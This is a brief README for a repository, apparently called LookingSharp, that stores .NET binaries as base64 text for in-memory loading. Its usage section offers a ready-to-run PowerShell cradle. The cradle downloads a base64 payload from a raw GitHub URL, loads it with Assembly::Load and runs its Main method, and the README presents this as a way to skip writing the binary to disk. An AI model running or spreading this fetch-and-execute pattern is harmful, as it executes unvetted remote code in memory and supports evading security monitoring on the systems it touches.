# LookingSharp
This repository has been created to hold all the .net binaries used for Reflection Assembly loading.


# Usage:
```
$content = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/felixguerrero12/LookingSharp/master/txt/ProcessManager.txt')
$ProcessManagerAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
[ProcessManager.Program]::Main("".Split())
```

This will remove the step of downloading the binary on disk and just load it straight into memory.
